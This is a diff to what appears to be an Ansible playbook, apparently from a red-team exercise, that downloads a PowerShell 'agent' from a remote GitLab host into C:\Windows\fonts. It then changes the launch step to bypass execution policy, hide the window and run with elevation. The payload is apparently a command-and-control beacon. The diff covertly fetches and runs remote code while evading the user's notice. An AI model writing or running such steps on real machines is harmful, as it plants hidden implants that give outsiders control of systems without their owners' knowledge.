@@ -28,4 +28,4 @@
      - name: Download agent
        win_shell: wget -o C:\\Windows\\fonts\\javalanche.ps1 https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsPayload.ps1?ref_type=heads
      - name: Run Agent
-       win_shell: powershell.exe "Start-Process powershell.exe -ArgumentList 'C:\Windows\fonts\javalanche.ps1 -beaconIPAddress 10.0.10.128'"
+       win_shell: powershell.exe "Start-Process powershell.exe -ExecutionPolicy ByPass -WindowStyle Hidden -File C:\Windows\fonts\javalanche.ps1 -RunAs"
